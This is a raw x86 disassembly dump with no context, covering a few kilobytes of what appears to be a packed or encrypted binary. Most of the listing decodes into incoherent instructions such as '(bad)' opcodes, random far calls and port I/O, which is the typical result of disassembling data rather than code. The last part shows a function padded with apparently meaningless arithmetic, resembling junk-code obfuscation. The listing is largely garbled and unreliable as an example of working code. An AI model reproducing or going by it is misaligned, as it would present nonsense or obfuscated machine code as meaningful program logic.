  418e1d:	pop    ds
  418e1e:	mov    edi,0xec2c771b
  418e23:	aas    
  418e24:	shl    BYTE PTR [edx-0x32],cl
  418e27:	retf   0xa07d
  418e2a:	mov    ah,0x51
  418e2c:	in     eax,0x55
  418e2e:	sbb    eax,0x6f016660
  418e33:	fldcw  WORD PTR [esi]
  418e35:	imul   edi,DWORD PTR [edx+0x3f],0x5e
  418e39:	mov    al,ds:0xfa8fa365
  418e3e:	jle    0x418e35
  418e40:	jge    0x418ea1
  418e42:	dec    ecx
  418e43:	sub    DWORD PTR ds:0x29fc039e,eax
  418e49:	mov    ecx,0x83449bcf
  418e4e:	arpl   WORD PTR [edi+0x7ca72f5e],ax
  418e54:	mov    esi,0xd3a12048
  418e59:	mov    bl,0x70
  418e5b:	cmp    al,0xd
  418e5d:	xchg   ecx,eax
  418e5e:	clc    
  418e5f:	ficomp WORD PTR [esi+0x19]
  418e62:	xor    al,0x8b
  418e64:	sub    eax,0x8379ed35
  418e69:	pusha  
  418e6a:	xor    DWORD PTR [ebx],0x68d461c8
  418e70:	jmp    0x418e7a
  418e72:	in     al,dx
  418e73:	inc    ebp
  418e74:	(bad)  
  418e75:	xchg   esp,eax
  418e76:	cmp    DWORD PTR [esi+0x187ae162],ebp
  418e7c:	adc    edx,edx
  418e7e:	dec    ebx
  418e7f:	test   al,0x83
  418e81:	in     al,dx
  418e82:	xor    esi,eax
  418e84:	xor    dh,BYTE PTR [ecx]
  418e86:	push   0xeecb868d
  418e8b:	mov    eax,0xff3548e6
  418e90:	sbb    al,dh
  418e92:	pop    esi
  418e93:	mov    eax,ds:0x37c417bc
  418e98:	xchg   ebx,esp
  418e9a:	not    BYTE PTR [ecx+0x251ffa5e]
  418ea0:	sar    DWORD PTR [ebp+edx*1-0x3f],cl
  418ea4:	jns    0x418f06
  418ea6:	sub    eax,0xffcc5a01
  418eab:	aas    
  418eac:	aam    0xc6
  418eae:	out    dx,al
  418eaf:	mov    dl,0x6f
  418eb1:	jecxz  0x418f0d
  418eb3:	sbb    eax,0x80b375f7
  418eb8:	(bad)
  418ebd:	or     al,0xa9
  418ebf:	cmp    DWORD PTR [edx],0xffffff93
  418ec2:	sub    DWORD PTR [esi+0x5e],ecx
  418ec5:	mov    ah,bh
  418ec7:	and    cl,al
  418ec9:	and    DWORD PTR ds:0x3160a606,ebx
  418ecf:	xchg   ebp,eax
  418ed0:	jno    0x418f4c
  418ed2:	xor    eax,0xeed8fa27
  418ed7:	fisubr DWORD PTR [edx]
  418ed9:	and    esi,0x6
  418edc:	xchg   ebx,eax
  418edd:	outs   dx,BYTE PTR ds:[esi]
  418ede:	xor    esi,DWORD PTR [edx+0x72]
  418ee1:	mov    al,0x92
  418ee3:	jge    0x418ebe
  418ee5:	pop    ebp
  418ee6:	inc    edx
  418ee7:	ds pop ss
  418ee9:	fidivr DWORD PTR [edi+0x11]
  418eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eed:	dec    esp
  418eee:	aaa    
  418eef:	jge    0x418ea6
  418ef1:	add    ebx,ebp
  418ef3:	aaa    
  418ef4:	call   0x11c7:0xeb79beaf
  418efb:	mov    esi,DWORD PTR [ecx-0xb]
  418efe:	inc    edx
  418eff:	mov    BYTE PTR [ebp-0xdb972a0],dl
  418f05:	sub    eax,0xc5bcea2d
  418f0a:	out    dx,al
  418f0b:	icebp  
  418f0c:	fistp  QWORD PTR [ecx]
  418f0e:	xor    al,0x85
  418f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f11:	jne    0x418ed1
  418f13:	mov    al,ds:0x412a8e1
  418f18:	dec    edx
  418f19:	out    0x3f,al
  418f1b:	push   ss
  418f1c:	push   edx
  418f1d:	mov    DWORD PTR [edx+0x71],edi
  418f20:	ss popa 
  418f22:	mov    ecx,0xe73a7fe4
  418f27:	xor    al,0x84
  418f29:	pusha  
  418f2a:	mov    al,ds:0x3fc44c32
  418f2f:	ret    
  418f30:	inc    ebx
  418f31:	call   0x4b8d:0xdc5c42ee
  418f38:	jbe    0x418efe
  418f3a:	dec    ecx
  418f3b:	mov    eax,ds:0x82414d1a
  418f40:	sub    dh,BYTE PTR [ebp+edi*4-0x497ea1e1]
  418f47:	xchg   ebx,eax
  418f48:	mov    ah,0x65
  418f4a:	jp     0x418f59
  418f4c:	mov    esp,0xb61d425f
  418f51:	into   
  418f52:	xchg   esi,eax
  418f53:	clc    
  418f54:	mov    bh,0xac
  418f56:	sar    DWORD PTR [ebx-0x910daa2],1
  418f5c:	test   eax,0x1eddc239
  418f61:	popa   
  418f62:	pushf  
  418f63:	retf   0xe3cf
  418f66:	and    eax,0xeebbaae8
  418f6b:	imul   ecx,DWORD PTR [ebx+0x7f],0x7e
  418f6f:	ins    DWORD PTR es:[edi],dx
  418f70:	outs   dx,BYTE PTR ds:[esi]
  418f71:	loop   0x418f8a
  418f73:	mov    eax,ds:0xe8e2fcae
  418f78:	sbb    DWORD PTR [edx-0x6da0ead8],esp
  418f7e:	sbb    cl,BYTE PTR [edi+ebx*1+0x5b7b9f3f]
  418f85:	mov    eax,ds:0x60943214
  418f8a:	mov    ebx,0x737af119
  418f8f:	test   DWORD PTR [ecx],ebp
  418f91:	js     0x418f81
  418f93:	adc    ah,cl
  418f95:	sahf   
  418f96:	inc    ebx
  418f97:	inc    edx
  418f98:	push   ds
  418f99:	sub    eax,DWORD PTR [ebp-0x5f]
  418f9c:	aad    0x9d
  418f9e:	mov    ebp,edi
  418fa0:	jns    0x418ffe
  418fa2:	mov    bh,0x19
  418fa4:	scas   al,BYTE PTR es:[edi]
  418fa5:	ja     0x418f95
  418fa7:	and    eax,0x5134022f
  418fac:	add    DWORD PTR [ebp+0x7e82a062],0xb1bdf63d
  418fb6:	dec    ebx
  418fb7:	inc    ebx
  418fb8:	mov    edx,0x5e7eccac
  418fbd:	jo     0x418f7d
  418fbf:	sbb    BYTE PTR [ebp+ebx*8-0xf],ch
  418fc3:	jge    0x419039
  418fc5:	pusha  
  418fc6:	fwait
  418fc7:	lods   al,BYTE PTR ds:[esi]
  418fc8:	out    dx,eax
  418fc9:	mov    ah,0x67
  418fcb:	sbb    eax,0x10ee7896
  418fd0:	inc    eax
  418fd1:	popf   
  418fd2:	std    
  418fd3:	rcl    eax,1
  418fd5:	imul   DWORD PTR [ebx-0x678e1860]
  418fdb:	iret   
  418fdc:	mov    ecx,0x5e4baf5d
  418fe1:	xchg   edi,eax
  418fe2:	gs jno 0x418f92
  418fe5:	xor    bh,bl
  418fe7:	and    al,0x9e
  418fe9:	pusha  
  418fea:	ins    BYTE PTR es:[edi],dx
  418feb:	or     eax,0x1179f20e
  418ff0:	push   esi
  418ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ff2:	jmp    0x418f83
  418ff4:	rcr    DWORD PTR [ebx],1
  418ff6:	add    DWORD PTR [ebx],edx
  418ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ff9:	lock add BYTE PTR [edx+0x77],bh
  418ffd:	pusha  
  418ffe:	fcmovnbe st,st(0)
  419000:	sub    DWORD PTR [esi],ebx
  419002:	in     eax,0x21
  419004:	jp     0x418feb
  419006:	pop    esp
  419007:	jle    0x419070
  419009:	mov    bh,al
  41900b:	fcomp  st(1)
  41900d:	pusha  
  41900e:	fild   DWORD PTR [edi+0x7]
  419011:	mov    al,ds:0xe9cda0c5
  419016:	sti    
  419017:	mov    ebp,0x475ccb09
  41901c:	pop    esi
  41901d:	sbb    DWORD PTR [eax+eax*1-0x79],esi
  419021:	aam    0x4f
  419023:	dec    esp
  419024:	push   ds
  419025:	pop    edx
  419026:	rol    dh,cl
  419028:	js     0x41900e
  41902a:	sbb    al,0xe1
  41902c:	stos   DWORD PTR es:[edi],eax
  41902d:	inc    edi
  41902e:	pop    ss
  41902f:	dec    eax
  419030:	pop    esi
  419031:	jne    0x41903d
  419033:	lea    edi,[esi-0x15]
  419036:	pusha  
  419037:	jg     0x41903c
  419039:	popa   
  41903a:	clc    
  41903b:	mov    ds:0xb02a348a,eax
  419040:	jae    0x419004
  419042:	out    dx,al
  419043:	icebp  
  419044:	and    DWORD PTR [ebp-0x16a3559d],ebp
  41904a:	nop
  41904b:	mov    eax,ds:0x40cc3465
  419050:	sub    cl,BYTE PTR [edx-0x2e]
  419053:	outs   dx,DWORD PTR ds:[esi]
  419054:	push   edx
  419055:	cmp    BYTE PTR [ecx+eax*4-0xc],dh
  419059:	pusha  
  41905a:	mov    ecx,0x2abf1bf3
  41905f:	es (bad) 
  419061:	pop    ebp
  419062:	fild   WORD PTR [ecx-0x6b]
  419065:	push   ecx
  419066:	outs   dx,BYTE PTR ds:[esi]
  419067:	mov    ecx,0xdc8375
  41906c:	sub    DWORD PTR [eax-0x20cf8d12],0xd785e69b
  419076:	adc    ah,BYTE PTR [esp+esi*2-0x8504626]
  41907d:	ret    
  41907e:	pop    esi
  41907f:	pop    ds
  419080:	dec    ecx
  419081:	inc    esp
  419082:	add    DWORD PTR [ebx+edi*2+0x425aeefd],ebx
  419089:	js     0x419100
  41908b:	aad    0x8e
  41908d:	pusha  
  41908e:	adc    DWORD PTR [eax],ecx
  419090:	sub    DWORD PTR [ebx+0x5b5de5c8],eax
  419096:	pop    ds
  419097:	outs   dx,DWORD PTR ds:[esi]
  419098:	sahf   
  419099:	and    al,0xee
  41909b:	cmp    al,bh
  41909d:	xchg   DWORD PTR [esi+eiz*4+0x3a],edx
  4190a1:	inc    ecx
  4190a2:	lahf   
  4190a3:	mov    eax,ds:0x1aa42c0e
  4190a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a9:	arpl   bp,cx
  4190ab:	pop    si
  4190ad:	(bad)  
  4190ae:	mov    ds:0xbb8c046c,al
  4190b3:	pop    esp
  4190b4:	lock pusha 
  4190b6:	sub    bl,0xbc
  4190b9:	mov    WORD PTR [esi-0x1857e55a],ds
  4190bf:	aad    0x73
  4190c1:	mov    eax,0x81be77e1
  4190c6:	fwait
  4190c7:	adc    BYTE PTR [esi+0x4ec3595f],0x4f
  4190ce:	push   0x58
  4190d0:	or     al,0x85
  4190d2:	ficomp WORD PTR [esi+ebx*2-0x1aaa4a18]
  4190d9:	cli    
  4190da:	mov    ah,0x54
  4190dc:	mov    ebx,0xceb2cb60
  4190e1:	add    dl,BYTE PTR [edx+esi*8-0x430f44a3]
  4190e8:	imul   ch
  4190ea:	mov    bh,0x80
  4190ec:	sub    BYTE PTR cs:[edi+0x266140ae],0x11
  4190f4:	or     BYTE PTR [ebp-0x2d],ah
  4190f7:	mov    WORD PTR [edx+0x2],gs
  4190fa:	out    dx,al
  4190fb:	sbb    al,0x1d
  4190fd:	jnp    0x41913a
  4190ff:	icebp  
  419100:	dec    ecx
  419101:	out    dx,al
  419102:	mov    esi,0x624cd3a0
  419107:	daa    
  419108:	inc    ebp
  419109:	sub    DWORD PTR [ecx+0x79815ead],edi
  41910f:	jns    0x41916b
  419111:	dec    eax
  419112:	mov    eax,ds:0x7627f74b
  419117:	mov    eax,ds:0xd5006518
  41911c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41911d:	push   ebp
  41911e:	mov    dl,0x82
  419120:	pop    esi
  419121:	enter  0x684d,0x44
  419125:	xchg   ebp,eax
  419126:	ret    
  419127:	outs   dx,DWORD PTR ds:[esi]
  419128:	mov    esp,DWORD PTR [eax+0x38]
  41912b:	pop    es
  41912c:	mov    ebx,0x4c58e6c4
  419131:	jle    0x419121
  419133:	and    al,0xed
  419135:	mov    ebx,0xd801292
  41913a:	(bad)  
  41913b:	mov    fs,WORD PTR [edx]
  41913d:	mov    ah,BYTE PTR [eax-0x2a24a113]
  419143:	dec    eax
  419144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419145:	and    al,0x3
  419147:	mov    al,0x85
  419149:	inc    eax
  41914a:	mov    ebp,0x2bd238ff
  41914f:	mov    eax,ds:0x7c34134e
  419154:	popa   
  419155:	dec    BYTE PTR [ecx-0x5c]
  419158:	or     al,0xbf
  41915a:	fwait
  41915b:	pop    ecx
  41915c:	add    dl,bl
  41915e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41915f:	imul   edi,ebp,0x2e
  419162:	and    BYTE PTR [esi-0x7d],al
  419165:	fistp  WORD PTR [ebx+0x23]
  419168:	ret    0xadb3
  41916b:	mov    bl,BYTE PTR gs:[esi]
  41916e:	popf   
  41916f:	mov    eax,ds:0xabb8347a
  419174:	or     dh,BYTE PTR [eax]
  419176:	in     al,dx
  419177:	mov    ch,0x5e
  419179:	xor    al,0xb9
  41917b:	inc    ebp
  41917c:	sbb    ch,bl
  41917e:	mov    bl,bh
  419180:	add    al,0xb7
  419182:	ins    DWORD PTR es:[edi],dx
  419183:	test   al,0xe7
  419185:	ins    DWORD PTR es:[edi],dx
  419186:	rcl    DWORD PTR [ecx-0x1d],cl
  419189:	shr    BYTE PTR [edi-0x3d768f38],0x9b
  419190:	adc    al,0x61
  419192:	jmp    0xc2a7:0x295ab6e
  419199:	inc    ecx
  41919a:	(bad)  
  41919b:	jo     0x4191f0
  41919d:	comiss xmm5,DWORD PTR [edi+0x5e]
  4191a1:	loope  0x4191aa
  4191a3:	aaa    
  4191a4:	cmp    ch,BYTE PTR [eax]
  4191a6:	and    eax,0x67614af7
  4191ab:	push   0xffffffb5
  4191ad:	mov    edi,fs
  4191af:	lea    eax,[ebx]
  4191b1:	push   ecx
  4191b2:	and    DWORD PTR [ecx+edx*4+0x5d7c40c1],eax
  4191b9:	mov    eax,0xf5198a90
  4191be:	ds ds push ds
  4191c1:	ror    ebx,1
  4191c3:	mov    esi,0xb03c8618
  4191c8:	pop    esi
  4191c9:	jge    0x4191a3
  4191cb:	aad    0x47
  4191cd:	xchg   DWORD PTR [edi+ecx*1],ebp
  4191d0:	pop    esi
  4191d1:	mov    dl,0xc
  4191d3:	cmc    
  4191d4:	jmp    DWORD PTR [esi]
  4191d6:	mov    ds:0xb76096ce,al
  4191db:	jmp    0x41923d
  4191dd:	push   es
  4191de:	mov    cl,0x4a
  4191e0:	sbb    eax,0xfb9d0181
  4191e5:	adc    ch,BYTE PTR [esi]
  4191e7:	pop    ebx
  4191e8:	mov    cl,0xdc
  4191ea:	gs call 0x7c24f338
  4191f0:	(bad)
  4191f3:	out    0x82,al
  4191f5:	ins    BYTE PTR es:[edi],dx
  4191f6:	out    0x98,eax
  4191f8:	push   ss
  4191f9:	sar    DWORD PTR [edx-0x1d],1
  4191fc:	pop    esi
  4191fd:	jb     0x41925c
  4191ff:	jmp    0x3fc7:0xa3dd2f2d
  419206:	(bad)  
  419207:	sub    edi,DWORD PTR [esi-0x78]
  41920a:	sahf   
  41920b:	loope  0x4191f1
  41920d:	lahf   
  41920e:	jmp    0x419246
  419210:	sub    cl,BYTE PTR [esi+0x3f]
  419213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419214:	cwde   
  419215:	loopne 0x4191d7
  419217:	stos   BYTE PTR es:[edi],al
  419218:	js     0x4191c5
  41921a:	pop    edx
  41921b:	sub    BYTE PTR [edi+0x61],dl
  41921e:	lods   al,BYTE PTR ds:[esi]
  41921f:	mov    al,0x89
  419221:	sub    BYTE PTR [edi+0xf],dl
  419224:	push   DWORD PTR [edi+0x598fc625]
  41922a:	inc    esp
  41922b:	scas   eax,DWORD PTR es:[edi]
  41922c:	imul   ebx,edi,0x5168d8fe
  419232:	inc    ebx
  419233:	jg     0x41922e
  419235:	pop    edx
  419236:	push   ds
  419237:	mov    edx,0x4f95c160
  41923c:	pop    esi
  41923d:	xor    DWORD PTR [edx+esi*8-0x7b],esp
  419241:	popf   
  419242:	mov    esp,0x1355cdae
  419247:	inc    eax
  419248:	shl    DWORD PTR [eax+0x6e],1
  41924b:	dec    esp
  41924c:	sub    edi,esi
  41924e:	je     0x419236
  419250:	pop    ebx
  419251:	xor    BYTE PTR [eax-0x75],bl
  419254:	in     al,dx
  419255:	jl     0x4192d5
  419257:	(bad)  
  419259:	loop   0x41926d
  41925b:	mov    eax,ds:0xf00efbea
  419260:	xchg   edi,eax
  419261:	pop    es
  419262:	int    0x46
  419264:	pusha  
  419265:	jmp    DWORD PTR [edi+0x39]
  419268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419269:	inc    esi
  41926a:	int3   
  41926b:	add    BYTE PTR [ecx-0x4c],ch
  41926e:	das    
  41926f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419270:	and    ch,BYTE PTR [esi]
  419272:	outs   dx,BYTE PTR ds:[esi]
  419273:	xor    DWORD PTR [ebp-0x4095110a],ebp
  419279:	add    ch,ah
  41927b:	mov    dl,0x0
  41927d:	arpl   si,di
  41927f:	(bad)  
  419280:	mul    DWORD PTR [eax-0x31]
  419283:	mov    edx,0x6d3d366
  419288:	cmp    dl,BYTE PTR [ebp-0x4a487812]
  41928e:	cmp    eax,0x1a3c34a7
  419293:	mov    eax,ds:0x987fdc5a
  419298:	sub    BYTE PTR [ecx-0x74a23058],dl
  41929e:	push   0xc4d4ff14
  4192a3:	inc    edi
  4192a4:	outs   dx,DWORD PTR ds:[esi]
  4192a5:	mov    dl,dh
  4192a7:	or     esi,esi
  4192a9:	pop    edi
  4192aa:	or     esi,DWORD PTR [ecx]
  4192ac:	or     esi,0xb4f26f05
  4192b2:	pminsw mm5,QWORD PTR [esi+0x63e3e79a]
  4192b9:	das    
  4192ba:	call   0xb54b90dd
  4192bf:	and    al,0x5b
  4192c1:	mov    ecx,0x4a62aca4
  4192c6:	outs   dx,BYTE PTR ds:[esi]
  4192c7:	sbb    BYTE PTR [esi-0x3b],ah
  4192ca:	cld    
  4192cb:	inc    esp
  4192cc:	mov    ecx,0xf7aaee7c
  4192d1:	jo     0x419283
  4192d3:	in     eax,dx
  4192d4:	inc    edi
  4192d5:	mov    bl,0xce
  4192d7:	mov    al,ds:0xd26bb232
  4192dc:	push   eax
  4192dd:	test   BYTE PTR [ebx+eax*4],al
  4192e0:	pop    esi
  4192e1:	pushf  
  4192e2:	push   cs
  4192e3:	xchg   ebp,eax
  4192e4:	into   
  4192e5:	cdq    
  4192e6:	push   edi
  4192e7:	xchg   esi,eax
  4192e8:	lds    esp,FWORD PTR [eax-0x47]
  4192eb:	lock adc edi,edx
  4192ee:	leave  
  4192ef:	jecxz  0x41931a
  4192f1:	jl     0x4192e1
  4192f3:	adc    eax,0xf3f49e27
  4192f8:	cmp    BYTE PTR [ebx+edi*8-0x6f06c960],bl
  4192ff:	mov    ebp,0x8560f3eb
  419304:	pop    esi
  419305:	mov    BYTE PTR [edi],ch
  419307:	(bad)  [esi-0x50]
  41930a:	(bad)  
  41930c:	sbb    BYTE PTR [ecx+0x72],ah
  41930f:	hlt    
  419310:	sbb    eax,0xc3d30e12
  419315:	out    0xee,al
  419317:	push   0x11
  419319:	jmp    0x2863d606
  41931e:	mov    esi,0xb9faaaa7
  419323:	jmp    0x1297:0x280fd12f
  41932a:	out    dx,al
  41932b:	dec    esi
  41932c:	addr16 ss jl 0x419397
  419330:	sbb    al,0x3
  419332:	push   esi
  419333:	mov    eax,ds:0xf2b445bb
  419338:	arpl   WORD PTR [ebx+0x7e5e8f86],si
  41933e:	sub    DWORD PTR [eax+eiz*8],esp
  419341:	mov    ds:0x61190c16,eax
  419346:	xlat   BYTE PTR ds:[ebx]
  419347:	outs   dx,BYTE PTR ds:[esi]
  419348:	loop   0x419376
  41934a:	mov    ebp,0xeda517d4
  41934f:	mov    BYTE PTR [edx+0x3e],cl
  419352:	xor    ebp,DWORD PTR [ebp+0x535a9082]
  419358:	jl     0x4193b7
  41935a:	xchg   edx,edi
  41935c:	sbb    DWORD PTR [ebp-0x4b],0xffffffa5
  419360:	xchg   BYTE PTR [edi],bh
  419362:	test   esp,0x16a60a67
  419368:	test   eax,esp
  41936a:	mov    ebp,DWORD PTR [ebx]
  41936c:	jnp    0x419313
  41936e:	ins    DWORD PTR es:[edi],dx
  41936f:	mov    eax,ds:0xb3498ae3
  419374:	int3   
  419375:	mov    DWORD PTR [ebx-0x5d53a410],edi
  41937b:	mov    al,ds:0xf6ebe67e
  419380:	stc    
  419381:	pusha  
  419382:	mov    al,0x5e
  419384:	pop    edx
  419385:	jns    0x4193ee
  419387:	push   ds
  419388:	shr    BYTE PTR [edi],cl
  41938a:	jmp    0x419388
  41938c:	test   BYTE PTR [ecx+eax*8],ch
  41938f:	sbb    ebp,eax
  419391:	sub    esi,0xf94bbc0
  419397:	test   al,0xca
  419399:	aaa    
  41939a:	jmp    esp
  41939c:	dec    esp
  41939d:	loope  0x41932f
  41939f:	mov    ds:0x6fb264f2,eax
  4193a4:	das    
  4193a5:	pop    edi
  4193a6:	inc    eax
  4193a7:	push   0x21a54441
  4193ac:	les    eax,FWORD PTR [esp+ecx*8]
  4193af:	add    BYTE PTR [edi],0x61
  4193b2:	mov    eax,0x7340bcac
  4193b7:	sub    ecx,DWORD PTR ds:0xd4eeee56
  4193bd:	xor    al,0x10
  4193bf:	pop    edi
  4193c0:	dec    edi
  4193c1:	push   ebp
  4193c2:	in     eax,dx
  4193c3:	mov    al,ds:0x1f591ea2
  4193c8:	sbb    al,0xb3
  4193ca:	jnp    0x4193b7
  4193cc:	pop    esi
  4193cd:	mov    eax,0x6a8259a3
  4193d2:	shl    BYTE PTR [eax],1
  4193d4:	ins    DWORD PTR es:[edi],dx
  4193d5:	pusha  
  4193d6:	fst    DWORD PTR [esi]
  4193d8:	inc    edi
  4193d9:	mov    edx,0xe8a42af
  4193de:	out    dx,al
  4193df:	jne    0x419429
  4193e1:	mov    al,ds:0x1d0b53a8
  4193e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193e7:	pop    edi
  4193e9:	mov    al,0x6b
  4193eb:	mov    ds:0xd9b2bea2,eax
  4193f0:	or     esp,DWORD PTR [ecx]
  4193f2:	pop    ss
  4193f3:	xchg   esp,eax
  4193f4:	jo     0x419419
  4193f6:	adc    DWORD PTR [ecx+0x52f704de],esp
  4193fc:	out    0xd,eax
  4193fe:	scas   eax,DWORD PTR es:[edi]
  4193ff:	les    esi,FWORD PTR [eax+0x5]
  419402:	clc    
  419403:	lods   eax,DWORD PTR ds:[esi]
  419404:	lock sub eax,0x94c037e8
  41940a:	in     al,0x8c
  41940c:	retf   0xcbc1
  41940f:	and    BYTE PTR [eax],bl
  419411:	in     eax,dx
  419412:	dec    ebx
  419413:	int3   
  419414:	imul   esp,DWORD PTR [edi-0x1889d715],0x90c4c532
  41941e:	push   edi
  41941f:	sbb    BYTE PTR [ebp-0x1bc055a0],ch
  419425:	fisub  WORD PTR [edx+0xc]
  419428:	xor    eax,0x6a35229b
  41942d:	pusha  
  41942e:	mov    esi,0x46228d52
  419433:	ja     0x419413
  419435:	pop    ecx
  419436:	push   0x76
  419438:	repnz pop ss
  41943a:	pop    ebx
  41943b:	popa   
  41943c:	xor    al,ch
  41943e:	jge    0x41945e
  419440:	pop    esi
  419441:	add    eax,0xafc65c7e
  419446:	add    eax,0x30190501
  41944b:	repnz pop esi
  41944d:	in     eax,dx
  41944e:	dec    ebp
  41944f:	mov    ebx,0x40248bf4
  419454:	pop    esi
  419455:	cmp    eax,0x13161da9
  41945a:	jl     0x419473
  41945c:	mov    al,0x60
  41945e:	mov    edx,0x982bde37
  419463:	test   BYTE PTR [ecx],cl
  419465:	pusha  
  419466:	out    dx,al
  419467:	dec    ebp
  419468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419469:	jecxz  0x419430
  41946b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41946c:	mov    ecx,0xbea15c8f
  419471:	fsubr  st(6),st
  419473:	push   ebx
  419474:	cli    
  419475:	jne    0x4194b9
  419477:	cmp    eax,edi
  419479:	loopne 0x419469
  41947b:	jns    0x419427
  41947d:	mov    ch,0xf5
  41947f:	mov    edx,0xa0deff2b
  419484:	xor    BYTE PTR [ebx],dl
  419486:	ror    DWORD PTR [esi+0x68e061ce],cl
  41948c:	pop    esi
  41948d:	sbb    esp,DWORD PTR [eax+edx*4+0x32]
  419491:	das    
  419492:	xor    eax,0x5d5f7f2e
  419497:	xchg   edx,eax
  419498:	sbb    edi,DWORD PTR [ecx+edx*4+0x4fa875a4]
  41949f:	mov    WORD PTR [edx-0x3e],?
  4194a2:	out    0xb2,eax
  4194a4:	ficomp DWORD PTR [edi]
  4194a6:	inc    eax
  4194a7:	pop    eax
  4194a8:	mov    esi,0x14349c3e
  4194ad:	dec    ebx
  4194ae:	test   BYTE PTR [esi+0x6a],bh
  4194b1:	pusha  
  4194b2:	popa   
  4194b3:	xchg   esi,eax
  4194b4:	push   cs
  4194b5:	scas   eax,DWORD PTR es:[edi]
  4194b6:	push   eax
  4194b7:	rcr    BYTE PTR [esi+0x7f],1
  4194ba:	add    eax,esp
  4194bc:	(bad)  [ebp-0x2f8a8e51]
  4194c2:	push   ebx
  4194c3:	xchg   ebp,eax
  4194c4:	es pop eax
  4194c6:	cdq    
  4194c7:	or     DWORD PTR [esi+0x40],ebx
  4194ca:	clc    
  4194cb:	aaa    
  4194cc:	xchg   ch,cl
  4194ce:	mov    ecx,0x22d65e4a
  4194d3:	ins    BYTE PTR es:[edi],dx
  4194d4:	sbb    ah,bh
  4194d6:	sbb    ebp,DWORD PTR [eax-0x42]
  4194d9:	pusha  
  4194da:	xchg   ebp,eax
  4194db:	xor    DWORD PTR [ecx],ebp
  4194dd:	inc    esp
  4194de:	sub    bh,BYTE PTR [edx-0x71]
  4194e1:	mov    eax,0xa69eed24
  4194e6:	out    dx,eax
  4194e7:	fcomi  st,st(4)
  4194e9:	fdiv   QWORD PTR [ecx+0x40100000]
  4194ef:	add    BYTE PTR [edx+0x6b],cl
  4194f2:	add    BYTE PTR [eax],al
  4194f4:	dec    edx
  4194f5:	jnp    0x419537
  4194f7:	add    dl,dl
  4194f9:	sbb    al,BYTE PTR [eax]
  4194fb:	add    BYTE PTR [esi+edx*4],bl
  4194fe:	inc    eax
  4194ff:	add    BYTE PTR [edx+0x6b],cl
  419502:	add    BYTE PTR [eax],al
  419504:	add    WORD PTR [ecx+0x0],ax
  419508:	dec    edx
  419509:	imul   eax,DWORD PTR [eax],0x0
  41950c:	mov    al,0x6c
  41950e:	inc    ecx
  41950f:	add    BYTE PTR [ebx],bh
  419511:	sub    BYTE PTR [eax],al
  419513:	add    BYTE PTR [eax],al
  419515:	lock inc esp
  419517:	add    BYTE PTR [ecx-0x52],bl
  41951a:	add    BYTE PTR [eax],al
  41951c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41951d:	leave  
  41951e:	inc    ecx
  41951f:	add    bh,bl
  419521:	or     DWORD PTR [ebx],eax
	...
  41952b:	add    BYTE PTR [ebp-0x75],dl
  41952e:	in     al,dx
  41952f:	sub    esp,0xf0
  419535:	mov    eax,0x52
  41953a:	mov    DWORD PTR [ebp-0x20],eax
  41953d:	push   ebx
  41953e:	sub    DWORD PTR [ebp-0x20],eax
  419541:	push   esi
  419542:	mov    ecx,0x1989
  419547:	sub    ecx,eax
  419549:	mov    eax,0x4f
  41954e:	sub    eax,ecx
  419550:	sub    eax,ecx
  419552:	or     eax,ecx
  419554:	add    DWORD PTR [ebp-0x20],eax
  419557:	push   edi
  419558:	or     DWORD PTR [ebp-0x20],eax
  41955b:	add    ecx,ecx
  41955d:	add    ecx,eax
  41955f:	or     ecx,eax
  419561:	or     ecx,eax
  419563:	add    ecx,eax
  419565:	mov    edi,DWORD PTR [ebp-0x20]
  419568:	xor    DWORD PTR [ebp-0x20],edi
  41956b:	cmp    edi,0xec2f
  419571:	je     0x419579
  419573:	mov    eax,DWORD PTR [ebp-0x20]
  419576:	add    DWORD PTR [ebp-0x20],eax
  419579:	mov    edx,ecx
  41957b:	add    edx,edi
  41957d:	add    edx,edx
  41957f:	and    edx,eax
  419581:	or     edx,eax
  419583:	sub    edx,eax
  419585:	cmp    edx,DWORD PTR [ebp-0x20]
  419588:	je     0x4195e1
  41958a:	add    DWORD PTR [ebp-0x20],ecx
  41958d:	mov    edi,DWORD PTR [ebp-0x20]
  419590:	sub    DWORD PTR [ebp-0x20],edx
  419593:	test   edi,0xb5
  419599:	jne    0x4195e1
  41959b:	sub    edi,ecx
  41959d:	mov    edx,DWORD PTR ds:0x459ef0
  4195a3:	mov    DWORD PTR [ebp-0x20],edx
  4195a6:	add    edi,edi
  4195a8:	add    edi,eax
  4195aa:	mov    ebx,DWORD PTR [ebp-0x20]
  4195ad:	sub    DWORD PTR [ebp-0x20],edi
  4195b0:	cmp    ebx,DWORD PTR [ebp-0xc]
  4195b3:	jne    0x4195e1
  4195b5:	sub    ebx,edi
  4195b7:	mov    eax,0xf7
  4195bc:	sub    eax,edx
  4195be:	mov    esi,0xf744
  4195c3:	sub    DWORD PTR [ebp-0x20],eax
  4195c6:	sub    esi,ecx
  4195c8:	sub    DWORD PTR [ebp-0x20],eax
  4195cb:	and    ebx,eax
  4195cd:	xor    DWORD PTR [ebp-0x20],esi
  4195d0:	sub    ebx,eax
  4195d2:	or     ebx,esi
  4195d4:	and    ebx,esi
  4195d6:	test   ebx,0x32
  4195dc:	jne    0x4195e1
  4195de:	or     DWORD PTR [ebp-0x20],ebx
  4195e1:	call   DWORD PTR ds:0x45a510
  4195e7:	sub    esi,edi
  4195e9:	mov    edx,DWORD PTR [ebp-0x20]
  4195ec:	cmp    esi,DWORD PTR [ebp-0xe0]
  4195f2:	jne    0x419617
  4195f4:	cmp    esi,0x84b0
  4195fa:	je     0x419617
  4195fc:	or     edx,esi
  4195fe:	mov    edi,0x74
  419603:	and    edx,ebx
  419605:	add    edx,edx
  419607:	mov    ecx,0x8a
